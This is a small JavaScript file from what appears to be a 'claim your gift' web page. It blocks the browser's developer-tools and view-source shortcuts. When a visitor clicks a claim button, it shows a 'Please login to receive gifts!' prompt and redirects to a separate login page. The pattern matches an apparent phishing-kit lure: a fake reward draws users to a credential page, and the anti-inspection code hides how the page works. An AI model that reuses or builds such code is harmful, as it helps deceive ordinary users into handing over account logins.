document.onkeydown = function(e) {
    if(event.keyCode == 123) {
        return false;
    }
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
        return false;
    }
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
        return false;
    }
    if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
        return false;
    }
};

function makeid(length) {
  var text = "";
  var possible = "a";

  for (var i = 0; i < length; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}

$(document).ready(function(){
    $('.nav-btn').click(function(){
        $('#menu-overlay').toggleClass('d-none');
        $('#menu-m').toggleClass('active');
        $("#menu-m").hasClass("active") ? $('#menu-button').removeClass('fa-bars').addClass('fa-times') : $('#menu-button').removeClass('fa-times').addClass('fa-bars');
    }),
    $(document).on('click', '.claim', function() {
        swal({
            title: 'Notification',
            text: 'Please login to receive gifts!',
            icon: 'error',
            buttons: {
                cancel: 'Closed',
                confirm: {
                    text: 'Check Login Page',
                    closeModal: false
                }
            },
            dangerMode: true,
            showLoaderOnConfirm: true
        }).then(function(confirm) {
            if (confirm) {
                window.location = makeid(3) + '_login.html';
            }
        });
    });
});